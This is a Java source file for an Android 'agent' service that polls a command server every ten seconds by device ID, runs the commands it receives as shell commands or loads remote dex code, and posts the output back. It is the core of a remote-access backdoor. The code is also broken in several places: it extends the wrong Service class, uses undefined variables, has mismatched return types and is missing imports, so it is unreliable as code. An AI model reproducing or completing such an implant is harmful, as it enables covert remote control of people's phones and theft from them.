package com.mobilemorph.agent.services;

import java.security.Provider;
import java.security.Provider.Service;
import java.util.List;
import java.util.Map;

import com.mobilemorph.agent.util.ShellExecutor;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CommandService extends Service {
    private static final String TAG = "CommandService";
    private static final String SERVER_URL = "http://127.0.0.1:5000"; // use local IP if not emulator
    private static final String DEVICE_ID =  Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

    public CommandService(Provider provider, String type, String algorithm, String className, List<String> aliases,
            Map<String, String> attributes) {
        super(provider, type, algorithm, className, aliases, attributes);
        //TODO Auto-generated constructor stub
    }

    private static final int START_STICKY = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CommandService started");

        new Thread(() -> {
            while (true) {
                try {
                    JSONObject cmd = fetchCommand();
                    if (cmd != null) {
                        String type = command.optString("type");
                        String payload = command.optString("payload");
                        String output = "";
                        
                        switch(type) {
                            case "exec":
                                output = ShellExecutor.execute(payload);
                                break;
                            case "dexload":
                                DexLoader.loadAndExecute(getApplicationContext(), payload);
                                output = "Executed dex payload: " + payload;
                                break;
                            case "sleep":
                                Thread.sleep(Long.parseLong(payload));
                                output = "Slept for " + payload + " ms";
                                break;
                            default:
                                output = "Unknown command type: " + type;
                                break;
                        }
                    }
                    postOutput(output);
                    Thread.sleep(10000); // Poll every 10 seconds
                } catch (Exception e) {
                    Log.e(TAG, "Error in command loop", e);
                }
            }
        }).start();

        return START_STICKY;
    }

    private JSONObject fetchCommand() {
        try {
            URL url = new URL(SERVER_URL + "/get_command/" + DEVICE_ID);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }

            JSONObject responseJson = new JSONObject(response.toString());
            return responseJson.getString("cmd");

        } catch (Exception e) {
            Log.e(TAG, "fetchCommand() failed", e);
            return null;
        }
    }

    private void postOutput(String output) {
        try {
            URL url = new URL(SERVER_URL + "/post_output");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            JSONObject payload = new JSONObject();
            payload.put("device_id", DEVICE_ID);
            payload.put("output", output);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();

            conn.getResponseCode(); // Force the POST to complete
        } catch (Exception e) {
            Log.e(TAG, "postOutput() failed", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not used
    }
}
